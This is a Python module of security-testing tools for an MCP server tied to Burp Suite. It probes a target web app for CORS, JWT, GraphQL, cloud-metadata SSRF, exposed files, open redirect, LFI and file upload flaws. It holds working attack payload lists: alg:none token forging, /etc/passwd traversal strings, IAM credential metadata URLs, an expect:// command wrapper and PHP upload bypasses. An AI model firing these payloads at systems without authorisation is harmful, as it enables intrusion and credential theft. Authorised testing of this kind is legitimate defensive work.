"""Edge-case security testing tools — JWT, CORS, GraphQL, LLM injection, WebSocket, cloud metadata."""

import asyncio
import base64
import json
import time
import uuid

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client


def _build_multipart(field_name: str, filename: str, content: str, content_type: str) -> tuple[str, str]:
    """Build a multipart/form-data body. Returns (body, boundary)."""
    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex[:16]}"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n\r\n"
        f"{content}\r\n"
        f"--{boundary}--\r\n"
    )
    return body, boundary


def register(mcp: FastMCP):

    @mcp.tool()
    async def test_cors(
        session: str,
        path: str = "/",
        test_origins: list[str] | None = None,
    ) -> str:
        """Test CORS configuration for origin reflection and credential misconfigs.

        Args:
            session: Session name
            path: Endpoint path to test
            test_origins: Custom origins to test
        """
        origins = test_origins or [
            "https://evil.com",
            "null",
            "https://evil.target.com",
            "https://target.com.evil.com",
        ]

        lines = [f"CORS Test: {path}\n"]
        vulns = []

        for origin in origins:
            headers = {"Origin": origin}
            resp = await client.post("/api/session/request", json={
                "session": session, "method": "GET", "path": path,
                "headers": headers,
            })
            if "error" in resp:
                lines.append(f"  [{origin}] Error: {resp['error']}")
                continue

            # Check response headers for CORS
            acao = ""
            acac = ""
            for h in resp.get("response_headers", []):
                if h["name"].lower() == "access-control-allow-origin":
                    acao = h["value"]
                if h["name"].lower() == "access-control-allow-credentials":
                    acac = h["value"]

            status = resp.get("status", "?")
            if acao:
                vuln = ""
                # Browsers compare ACAO byte-for-byte with Origin. Substring match
                # would false-positive when ACAO contains a longer legitimate origin
                # (e.g. origin="https://evil.com" vs acao="https://evil.commerce.com").
                if acac.lower() == "true":
                    if acao == "*":
                        vuln = "CRITICAL: Wildcard + Credentials"
                        vulns.append(vuln)
                    elif acao == origin:
                        vuln = "CRITICAL: Origin reflected + Credentials"
                        vulns.append(vuln)
                    elif acao == "null":
                        vuln = "HIGH: Null origin + Credentials"
                        vulns.append(vuln)
                elif acao == origin:
                    vuln = "MEDIUM: Origin reflected (no credentials)"
                    vulns.append(vuln)

                lines.append(f"  [{origin}] {status} -> ACAO: {acao}, ACAC: {acac} {vuln}")
            else:
                lines.append(f"  [{origin}] {status} -> No CORS headers")

        if vulns:
            lines.append(f"\n*** {len(vulns)} CORS vulnerabilities found ***")
        else:
            lines.append(f"\nNo CORS misconfigurations detected.")

        return "\n".join(lines)

    @mcp.tool()
    async def test_jwt(
        token: str,
    ) -> str:
        """Analyze a JWT token for vulnerabilities and attack vectors.

        Args:
            token: JWT token string
        """
        parts = token.split(".")
        if len(parts) != 3:
            return f"Error: Invalid JWT format (expected 3 parts, got {len(parts)})"

        # Decode header and payload
        try:
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        except Exception as e:
            return f"Error decoding JWT: {e}"

        lines = ["JWT Analysis:\n"]
        lines.append(f"Header: {json.dumps(header, indent=2)}")
        lines.append(f"Payload: {json.dumps(payload, indent=2)}")

        alg = header.get("alg", "unknown")
        lines.append(f"\nAlgorithm: {alg}")

        # Check for vulnerabilities
        vulns = []

        # alg:none
        if alg.lower() in ("none", ""):
            vulns.append("CRITICAL: Algorithm is 'none' — token has no signature verification")

        # Weak algorithms
        if alg in ("HS256", "HS384", "HS512"):
            vulns.append(f"INFO: Symmetric algorithm ({alg}) — test with common secrets (secret, password, 123456)")
            # Generate alg:none token
            none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
            none_token = f"{none_header}.{parts[1]}."
            vulns.append(f"TEST: Try alg:none bypass token: {none_token}")

        # RS256 → HS256 confusion
        if alg in ("RS256", "RS384", "RS512"):
            vulns.append(f"TEST: Algorithm confusion — try changing to HS256 and sign with public key")

        # JKU/X5U header injection
        if "jku" in header:
            vulns.append(f"HIGH: jku header present ({header['jku']}) — test with attacker-controlled URL")
        if "x5u" in header:
            vulns.append(f"HIGH: x5u header present ({header['x5u']}) — test with attacker-controlled URL")

        # KID injection
        if "kid" in header:
            vulns.append(f"TEST: kid parameter present ({header['kid']}) — test path traversal: ../../etc/passwd")
            vulns.append(f"TEST: kid SQLi: ' UNION SELECT 'key'--")

        # Check payload claims
        exp = payload.get("exp")
        if exp:
            if exp < time.time():
                vulns.append(f"INFO: Token expired (exp: {exp})")
            else:
                remaining = int(exp - time.time())
                vulns.append(f"INFO: Token expires in {remaining}s")

        if payload.get("admin") or payload.get("role") == "admin":
            vulns.append(f"INFO: Token has admin privileges — test with modified non-admin token")

        iss = payload.get("iss", "")
        if iss:
            vulns.append(f"INFO: Issuer: {iss}")

        if vulns:
            lines.append(f"\nVulnerability Assessment ({len(vulns)}):")
            for v in vulns:
                lines.append(f"  {v}")
        else:
            lines.append("\nNo obvious vulnerabilities in token structure.")

        return "\n".join(lines)

    @mcp.tool()
    async def test_graphql(
        session: str,
        path: str = "/graphql",
    ) -> str:
        """Test GraphQL endpoint for introspection, field suggestions, batch queries, and GET CSRF.

        Args:
            session: Session name
            path: GraphQL endpoint path
        """
        lines = [f"GraphQL Security Test: {path}\n"]
        vulns = []

        # Test 1: Introspection
        introspection_query = '{"query":"{__schema{types{name kind}}}"}'
        resp = await client.post("/api/session/request", json={
            "session": session, "method": "POST", "path": path,
            "headers": {"Content-Type": "application/json"},
            "body": introspection_query,
        })
        if "error" not in resp:
            body = resp.get("response_body", "")
            if "__schema" in body and "types" in body:
                vulns.append("HIGH: Introspection enabled — full schema exposed")
                lines.append(f"  [VULN] Introspection: ENABLED (schema leaked)")
            elif resp.get("status") == 200:
                lines.append(f"  [OK] Introspection: Disabled or filtered")
            else:
                lines.append(f"  [?] Introspection: Status {resp.get('status')}")
        else:
            lines.append(f"  [ERR] Introspection: {resp['error']}")

        # Test 2: Field suggestion leakage
        suggestion_query = '{"query":"{userss{id}}"}'
        resp2 = await client.post("/api/session/request", json={
            "session": session, "method": "POST", "path": path,
            "headers": {"Content-Type": "application/json"},
            "body": suggestion_query,
        })
        if "error" not in resp2:
            body2 = resp2.get("response_body", "")
            if "did you mean" in body2.lower() or "suggestion" in body2.lower():
                vulns.append("MEDIUM: Field suggestions enabled — schema can be enumerated via typos")
                lines.append(f"  [VULN] Field suggestions: LEAKING schema hints")
            else:
                lines.append(f"  [OK] Field suggestions: Not detected")

        # Test 3: Batch query support
        batch_query = '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
        resp3 = await client.post("/api/session/request", json={
            "session": session, "method": "POST", "path": path,
            "headers": {"Content-Type": "application/json"},
            "body": batch_query,
        })
        if "error" not in resp3:
            body3 = resp3.get("response_body", "")
            status3 = resp3.get("status", 0)
            if status3 == 200 and body3.count("__typename") >= 2:
                vulns.append("MEDIUM: Batch queries accepted — potential DoS vector")
                lines.append(f"  [VULN] Batch queries: ACCEPTED (DoS risk)")
            else:
                lines.append(f"  [OK] Batch queries: Not supported or filtered")

        # Test 4: GET-based query (potential CSRF)
        resp4 = await client.post("/api/session/request", json={
            "session": session, "method": "GET",
            "path": f"{path}?query={{__typename}}",
        })
        if "error" not in resp4:
            body4 = resp4.get("response_body", "")
            if "__typename" in body4.lower():
                vulns.append("LOW: GET-based queries accepted — potential CSRF")
                lines.append(f"  [VULN] GET queries: ACCEPTED (CSRF risk)")
            else:
                lines.append(f"  [OK] GET queries: Not accepted")

        if vulns:
            lines.append(f"\n*** {len(vulns)} GraphQL vulnerabilities found ***")
        else:
            lines.append(f"\nNo GraphQL vulnerabilities detected.")

        return "\n".join(lines)

    @mcp.tool()
    async def test_cloud_metadata(
        session: str,
        parameter: str = "url",
        path: str = "/",
        injection_point: str = "query",
    ) -> str:
        """Test SSRF to cloud metadata services (AWS, GCP, Azure, DigitalOcean).

        Args:
            session: Session name
            parameter: Parameter to inject SSRF payload into
            path: Endpoint path
            injection_point: Where to inject: 'query' or 'body'
        """
        metadata_endpoints = [
            ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname"]),
            # Each indicator must be specific enough that it's extremely unlikely to
            # appear in a non-metadata response. Weak generic words like "hostname",
            # "network", "compute", "instance" are rejected — they match documentation
            # pages, API listings, and any page mentioning servers.
            ("AWS IMDSv1 IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
            ("AWS Hex IP", "http://0xA9FEA9FE/latest/meta-data/", ["ami-id", "instance-id"]),
            ("AWS Decimal IP", "http://2852039166/latest/meta-data/", ["ami-id", "instance-id"]),
            ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/", ["project-id", "service-accounts/default"]),
            ("Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["azEnvironment", "vmId"]),
            ("DigitalOcean", "http://169.254.169.254/metadata/v1/", ["droplet_id"]),
        ]

        lines = [f"Cloud Metadata SSRF Test: {parameter} on {path}\n"]
        vulns = []

        for name, url, indicators in metadata_endpoints:
            inject_path = f"{path}?{parameter}={url}" if injection_point == "query" else path
            req = {"session": session, "method": "GET", "path": inject_path}
            if injection_point == "body":
                req["method"] = "POST"
                req["data"] = f"{parameter}={url}"

            resp = await client.post("/api/session/request", json=req)
            if "error" in resp:
                lines.append(f"  [{name}] Error")
                continue

            body = resp.get("response_body", "")
            status = resp.get("status", 0)
            matched = [i for i in indicators if i.lower() in body.lower()]

            if matched:
                vulns.append(f"CRITICAL: {name} — metadata leaked ({', '.join(matched)})")
                lines.append(f"  [{name}] VULNERABLE — {', '.join(matched)} found in response")
            elif status == 200 and len(body) > 100:
                lines.append(f"  [{name}] Possible — 200 OK, {len(body)}B response (review manually)")
            else:
                lines.append(f"  [{name}] Not vulnerable ({status})")

        if vulns:
            lines.append(f"\n*** {len(vulns)} CLOUD METADATA LEAKS ***")
        else:
            lines.append(f"\nNo cloud metadata exposure detected.")

        return "\n".join(lines)

    @mcp.tool()
    async def discover_common_files(
        session: str,
        tech_specific: bool = True,
    ) -> str:
        """Probe for common sensitive files and paths (.git, .env, actuator, etc).

        Args:
            session: Session name
            tech_specific: Add tech-specific paths based on detected stack
        """
        # Universal paths
        paths = [
            "/.git/HEAD", "/.git/config", "/.env", "/.env.bak",
            "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
            "/.htaccess", "/.htpasswd",
            "/web.config", "/Web.config",
            "/package.json", "/composer.json",
            "/wp-config.php.bak", "/wp-config.php~",
            "/server-status", "/server-info",
            "/.svn/entries", "/.DS_Store",
            "/backup/", "/debug/", "/test/", "/admin/",
            "/phpinfo.php", "/info.php",
            "/elmah.axd", "/trace.axd",
            "/actuator", "/actuator/env", "/actuator/heapdump",
            "/console", "/__debug__/",
            "/swagger.json", "/api-docs", "/openapi.json",
        ]

        # Batch probe all paths
        endpoints = [{"method": "GET", "path": p} for p in paths]
        data = await client.post("/api/session/batch", json={
            "session": session, "endpoints": endpoints,
        })
        if "error" in data:
            return f"Error: {data['error']}"

        lines = [f"Common Files Scan: {len(paths)} paths tested\n"]
        found = []
        for r in data.get("results", []):
            status = r.get("status", 0)
            length = r.get("length", 0)
            path_tested = r.get("path", "?")
            if status == 200 and length > 0:
                found.append(r)
                lines.append(f"  [FOUND] {path_tested} -> {status} ({length}B)")
            elif status in (301, 302):
                lines.append(f"  [REDIR] {path_tested} -> {status}")
            elif status == 403:
                lines.append(f"  [DENY]  {path_tested} -> 403 (exists but blocked)")

        if found:
            lines.append(f"\n*** {len(found)} sensitive files/paths accessible ***")

            # Categorize findings
            for r in found:
                p = r.get("path", "")
                if ".git" in p:
                    lines.append(f"  CRITICAL: Git repository exposed ({p})")
                elif ".env" in p:
                    lines.append(f"  CRITICAL: Environment file exposed ({p})")
                elif "actuator" in p:
                    lines.append(f"  HIGH: Spring Actuator exposed ({p})")
                elif "phpinfo" in p or "info.php" in p:
                    lines.append(f"  HIGH: PHP info page exposed ({p})")
                elif "swagger" in p or "api-docs" in p or "openapi" in p:
                    lines.append(f"  MEDIUM: API documentation exposed ({p})")
                elif "debug" in p or "console" in p:
                    lines.append(f"  HIGH: Debug interface exposed ({p})")
        else:
            lines.append(f"\nNo sensitive files found.")

        return "\n".join(lines)

    # ── New edge-case tools ──────────────────────────────────────────

    @mcp.tool()
    async def test_open_redirect(
        session: str,
        path: str,
        parameter: str,
        poll_seconds: int = 5,
        follow_redirects: bool = False,
    ) -> str:
        """Test open redirect with Collaborator-verified DNS/HTTP confirmation.

        Args:
            session: Session name
            path: Endpoint path
            parameter: Redirect parameter name
            poll_seconds: Seconds to wait before polling (max 15)
            follow_redirects: Follow redirects to test client-side behavior
        """
        # Step 1: Generate Collaborator payload
        collab = await client.post("/api/collaborator/payload")
        if "error" in collab:
            return f"Error generating Collaborator payload: {collab['error']}\nRequires Burp Suite Professional."

        collab_url = collab.get("payload", "")
        collab_host = collab_url.replace("http://", "").replace("https://", "").split("/")[0]
        if not collab_host:
            return "Error: Could not extract Collaborator host from payload."

        # Step 2: Build redirect payloads using the real Collaborator URL
        payloads = [
            (f"https://{collab_host}", "Absolute URL"),
            (f"//{collab_host}", "Protocol-relative"),
            (f"\\/\\/{collab_host}", "Escaped slashes"),
            (f"////{collab_host}", "Quadruple slash"),
            (f"https:{collab_host}", "Missing slashes"),
            (f"//{collab_host}%2F%2F", "URL-encoded trailing slashes"),
            (f"//{collab_host}?target.com", "Collaborator as host, target as query"),
            (f"https://target.com@{collab_host}", "At-sign authority confusion"),
            (f"https://{collab_host}%00.target.com", "Null byte domain truncation"),
            (f"https://{collab_host}/.target.com", "Dot after Collaborator host"),
        ]

        sep = "&" if "?" in path else "?"
        lines = [f"Open Redirect Test (Collaborator-verified): {parameter} on {path}"]
        lines.append(f"Collaborator: {collab_host}\n")
        lines.append(f"{'#':<4} {'PAYLOAD':<50} {'STATUS':<8} {'LOCATION'}")
        lines.append("-" * 100)

        # Step 3: Send all payloads
        redirect_candidates = []
        for i, (payload, desc) in enumerate(payloads, 1):
            inject_path = f"{path}{sep}{parameter}={payload}"
            resp = await client.post("/api/session/request", json={
                "session": session, "method": "GET", "path": inject_path,
                "follow_redirects": follow_redirects,
            })
            if "error" in resp:
                lines.append(f"{i:<4} {desc:<50} {'ERR':<8} —")
                continue

            status = resp.get("status", 0)
            location = ""
            for h in resp.get("response_headers", []):
                if h["name"].lower() == "location":
                    location = h["value"]
                    break

            # Track candidates: any 3xx or location header containing collaborator
            is_redirect = status in (301, 302, 303, 307, 308)
            has_collab_in_loc = collab_host in location if location else False

            loc_display = location[:45] + ".." if len(location) > 45 else location
            if has_collab_in_loc:
                redirect_candidates.append(desc)
                lines.append(f"{i:<4} {desc:<50} {status:<8} {loc_display} [REDIRECT TO COLLAB]")
            elif is_redirect:
                lines.append(f"{i:<4} {desc:<50} {status:<8} {loc_display}")
            else:
                lines.append(f"{i:<4} {desc:<50} {status:<8} {'(no redirect)'}")

        # Step 4: Poll Collaborator for REAL interactions
        lines.append("")
        poll_seconds = min(max(poll_seconds, 1), 15)
        lines.append(f"Polling Collaborator for {poll_seconds}s...")

        await asyncio.sleep(poll_seconds)

        interactions_data = await client.get("/api/collaborator/interactions")
        interactions = interactions_data.get("interactions", []) if "error" not in interactions_data else []

        # Count DNS/HTTP interactions as confirmation
        dns_hits = [i for i in interactions if i.get("type") == "DNS"]
        http_hits = [i for i in interactions if i.get("type") == "HTTP"]

        lines.append("")
        if dns_hits or http_hits:
            total_hits = len(dns_hits) + len(http_hits)
            lines.append(f"*** CONFIRMED: {total_hits} Collaborator interaction(s) detected ***")
            if dns_hits:
                lines.append(f"  DNS lookups: {len(dns_hits)}")
                for hit in dns_hits[:5]:
                    lines.append(f"    from {hit.get('client_ip', '?')} at {hit.get('timestamp', '?')}")
            if http_hits:
                lines.append(f"  HTTP callbacks: {len(http_hits)}")
                for hit in http_hits[:5]:
                    lines.append(f"    from {hit.get('client_ip', '?')} at {hit.get('timestamp', '?')}")

            lines.append("")
            lines.append("The target server followed the redirect to the Collaborator URL.")
            lines.append("This is a CONFIRMED open redirect vulnerability.")
            if redirect_candidates:
                lines.append(f"\nWorking bypass techniques: {', '.join(redirect_candidates)}")
        else:
            lines.append("No Collaborator interactions detected.")
            if redirect_candidates:
                lines.append(f"\nNote: {len(redirect_candidates)} payload(s) showed redirect in Location header")
                lines.append(f"  ({', '.join(redirect_candidates)})")
                lines.append("  These may still be exploitable client-side (browser follows redirect).")
                lines.append("  The Collaborator test only confirms server-side following.")
            else:
                lines.append("No open redirect detected (no redirects to Collaborator, no interactions).")

        return "\n".join(lines)

    @mcp.tool()
    async def test_lfi(
        session: str,
        path: str,
        parameter: str,
        os_type: str = "auto",
        test_wrappers: bool = True,
        depth: int = 6,
    ) -> str:
        """Test for LFI/path traversal with encoding bypasses and PHP wrappers.

        Args:
            session: Session name
            path: Endpoint path
            parameter: File parameter name
            os_type: 'linux', 'windows', or 'auto'
            test_wrappers: Test PHP stream wrappers
            depth: Traversal depth
        """
        depth = min(depth, 20)
        payloads = []
        traversal = "../" * depth

        # Linux payloads
        if os_type in ("auto", "linux"):
            payloads.extend([
                (f"{traversal}etc/passwd", "linux", "Basic traversal"),
                (f"{'..%2f' * depth}etc%2fpasswd", "linux", "URL-encoded slash"),
                (f"{'..%252f' * depth}etc%252fpasswd", "linux", "Double URL-encoded"),
                (f"{'....//..../' * (depth // 2)}etc/passwd", "linux", "Double-dot filter bypass"),
                (f"{'..%c0%af' * depth}etc/passwd", "linux", "UTF-8 overlong encoding"),
                ("/etc/passwd", "linux", "Absolute path"),
                (f"{traversal}proc/self/environ", "linux", "Process environment"),
            ])

        # Windows payloads
        if os_type in ("auto", "windows"):
            win_traversal = "..\\" * depth
            payloads.extend([
                (f"{win_traversal}windows\\win.ini", "windows", "Backslash traversal"),
                (f"{traversal}windows/win.ini", "windows", "Forward slash traversal"),
                (f"{'..%5c' * depth}windows%5cwin.ini", "windows", "URL-encoded backslash"),
                (f"{'..%255c' * depth}windows%255cwin.ini", "windows", "Double URL-encoded backslash"),
                (f"{win_traversal}inetpub\\wwwroot\\web.config", "windows", "IIS web.config"),
            ])

        # PHP wrappers
        if test_wrappers:
            payloads.extend([
                ("php://filter/convert.base64-encode/resource=index", "wrapper", "php://filter base64"),
                ("php://filter/convert.base64-encode/resource=../config", "wrapper", "php://filter config"),
                ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "wrapper", "data:// phpinfo"),
                ("expect://id", "wrapper", "expect:// command exec"),
                (f"{traversal}etc/passwd%00.png", "null_byte", "Null byte truncation"),
            ])

        # Baseline
        sep = "&" if "?" in path else "?"
        baseline_resp = await client.post("/api/session/request", json={
            "session": session, "method": "GET", "path": path,
        })
        baseline_length = baseline_resp.get("response_length", 0) if "error" not in baseline_resp else 0

        # Linux/Windows indicators.
        # Strong /etc/passwd markers only — "/bin/bash", "/bin/sh", "daemon:" alone
        # false-positive on docs, man pages, or any shell-scripting content.
        linux_indicators = ["root:x:0:0:", "root:!:0:0:", "root:*:0:0:",
                            "nobody:x:", "daemon:x:1:"]
        windows_indicators = ["[fonts]", "[extensions]", "for 16-bit app", "[mail]"]
        # Wrapper markers: "<?php" decoded prefix (PD9waH), "<!DOCTYPE" decoded
        # prefix (PCFET0). "eyJ" dropped — it's the base64 prefix of every JWT
        # token, so false-positives on any page that renders JWTs.
        wrapper_indicators = ["PD9waH", "PCFET0"]

        lines = [f"LFI/Path Traversal Test: {parameter} on {path}\n"]
        lines.append(f"OS: {os_type} | Depth: {depth} | Wrappers: {test_wrappers}")
        lines.append(f"Baseline length: {baseline_length}B\n")
        lines.append(f"{'PAYLOAD':<55} {'STATUS':<8} {'LEN':<8} {'RESULT'}")
        lines.append("-" * 110)
        vulns = []

        for payload, ptype, desc in payloads:
            inject_path = f"{path}{sep}{parameter}={payload}"
            resp = await client.post("/api/session/request", json={
                "session": session, "method": "GET", "path": inject_path,
            })
            if "error" in resp:
                lines.append(f"{desc:<55} {'ERR':<8} {'?':<8} Error")
                continue

            status = resp.get("status", 0)
            length = resp.get("response_length", 0)
            body = resp.get("response_body", "")

            # Check indicators
            vulnerable = False
            result = "No match"

            if ptype == "linux":
                matched = [i for i in linux_indicators if i in body]
                if matched:
                    vulnerable = True
                    result = f"VULNERABLE ({', '.join(matched)})"
            elif ptype == "windows":
                matched = [i for i in windows_indicators if i.lower() in body.lower()]
                if matched:
                    vulnerable = True
                    result = f"VULNERABLE ({', '.join(matched)})"
            elif ptype == "wrapper":
                # Check for base64 content or phpinfo
                if any(ind in body for ind in wrapper_indicators):
                    vulnerable = True
                    result = "VULNERABLE (wrapper content)"
                elif "phpinfo" in body.lower() or "<title>phpinfo()" in body:
                    vulnerable = True
                    result = "VULNERABLE (phpinfo)"
            elif ptype == "null_byte":
                matched = [i for i in linux_indicators if i in body]
                if matched:
                    vulnerable = True
                    result = f"VULNERABLE (null byte bypass)"

            # Length anomaly
            if not vulnerable and status == 200 and baseline_length > 0:
                diff_pct = abs(length - baseline_length) / baseline_length * 100 if baseline_length else 0
                if diff_pct > 50 and length > baseline_length:
                    result = f"ANOMALY (+{diff_pct:.0f}% length)"

            if vulnerable:
                vulns.append(desc)

            payload_display = desc[:53] + ".." if len(desc) > 53 else desc
            marker = " ***" if vulnerable else ""
            lines.append(f"{payload_display:<55} {status:<8} {length:<8} {result}{marker}")

        lines.append("")
        if vulns:
            lines.append(f"*** {len(vulns)} LFI/path traversal vulnerabilities found ***")
            for v in vulns:
                lines.append(f"  -> {v}")
        else:
            lines.append("No LFI/path traversal detected.")

        return "\n".join(lines)

    @mcp.tool()
    async def test_file_upload(
        session: str,
        path: str,
        parameter: str = "file",
        test_types: list[str] | None = None,
        content_type_bypass: bool = True,
    ) -> str:
        """Test file upload for bypass vulnerabilities with extension and content-type evasion.

        Args:
            session: Session name
            path: Upload endpoint path
            parameter: Form field name for file upload
            test_types: Types to test: php, jsp, aspx, svg_xss, html, polyglot
            content_type_bypass: Test with mismatched Content-Type headers
        """
        types = test_types or ["php", "html", "svg_xss", "polyglot"]

        # Define test cases: (filename, content, content_type, description)
        test_cases = []

        if "php" in types:
            test_cases.extend([
                ("test.php", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "PHP direct upload"),
                ("test.php.jpg", "<?php echo 'UPLOAD_TEST_OK'; ?>", "image/jpeg", "PHP double extension"),
                ("test.phtml", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "PHTML extension"),
                ("test.php5", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "PHP5 extension"),
                ("test.pHp", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "Mixed case PHP"),
            ])
            if content_type_bypass:
                test_cases.append(
                    ("test.php", "<?php echo 'UPLOAD_TEST_OK'; ?>", "image/jpeg", "PHP with image/jpeg CT"),
                )

        if "jsp" in types:
            test_cases.extend([
                ("test.jsp", '<%= "UPLOAD_TEST_OK" %>', "application/x-jsp", "JSP direct upload"),
                ("test.jsp.png", '<%= "UPLOAD_TEST_OK" %>', "image/png", "JSP double extension"),
                ("test.jspx", '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0"><jsp:text>UPLOAD_TEST_OK</jsp:text></jsp:root>', "application/xml", "JSPX extension"),
            ])

        if "aspx" in types:
            test_cases.extend([
                ("test.aspx", '<%@ Page Language="C#" %><%= "UPLOAD_TEST_OK" %>', "application/x-aspx", "ASPX direct upload"),
                ("test.aspx;.jpg", '<%@ Page Language="C#" %><%= "UPLOAD_TEST_OK" %>', "image/jpeg", "ASPX semicolon bypass"),
            ])

        if "svg_xss" in types:
            test_cases.extend([
                ("test.svg", '<svg onload=alert("UPLOAD_TEST_OK")>', "image/svg+xml", "SVG onload XSS"),
                ("test.svg", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("UPLOAD_TEST_OK")</script></svg>', "image/svg+xml", "SVG script XSS"),
            ])

        if "html" in types:
            test_cases.append(
                ("test.html", "<html><body><script>alert('UPLOAD_TEST_OK')</script></body></html>", "text/html", "HTML with JavaScript"),
            )

        if "polyglot" in types:
            test_cases.append(
                ("test.gif.php", "GIF89a; <?php echo 'UPLOAD_TEST_OK'; ?>", "image/gif", "GIF+PHP polyglot"),
            )

        lines = [f"File Upload Test: {path} (field: {parameter})\n"]
        lines.append(f"{'FILENAME':<25} {'CONTENT-TYPE':<22} {'STATUS':<8} {'RESULT':<20} {'DESCRIPTION'}")
        lines.append("-" * 110)
        vulns = []

        for filename, content, ct, desc in test_cases:
            body, boundary = _build_multipart(parameter, filename, content, ct)
            resp = await client.post("/api/session/request", json={
                "session": session,
                "method": "POST",
                "path": path,
                "headers": {"Content-Type": f"multipart/form-data; boundary={boundary}"},
                "body": body,
            })

            if "error" in resp:
                lines.append(f"{filename:<25} {ct:<22} {'ERR':<8} {'Error':<20} {desc}")
                continue

            status = resp.get("status", 0)
            resp_body = resp.get("response_body", "").lower()

            # Determine if upload succeeded
            uploaded = False
            result = "Rejected"
            if status in (200, 201):
                success_indicators = ["uploaded", "success", "stored", "saved"]
                reject_indicators = ["error", "invalid", "not allowed", "rejected", "forbidden", "unsupported", "denied"]

                success_count = sum(1 for ind in success_indicators if ind in resp_body)
                has_reject = any(ind in resp_body for ind in reject_indicators)
                has_success = success_count >= 1

                if has_success and not has_reject:
                    uploaded = True
                    result = "UPLOADED"
                    vulns.append(f"{filename} ({desc})")
                elif not has_reject:
                    result = "Possible (200)"
            elif status == 403:
                result = "Forbidden"
            elif status == 415:
                result = "Type rejected"

            marker = " ***" if uploaded else ""
            lines.append(f"{filename:<25} {ct:<22} {status:<8} {result:<20} {desc}{marker}")

        lines.append("")
        if vulns:
            lines.append(f"*** {len(vulns)} potentially dangerous uploads accepted ***")
            for v in vulns:
                lines.append(f"  -> {v}")
            lines.append("\nNext steps:")
            lines.append("  1. Check if uploaded files are accessible (look for URL/path in response)")
            lines.append("  2. Try accessing uploaded file to confirm execution")
            lines.append("  3. Test with web shell payloads if execution confirmed")
        else:
            lines.append("No dangerous file uploads accepted.")

        return "\n".join(lines)
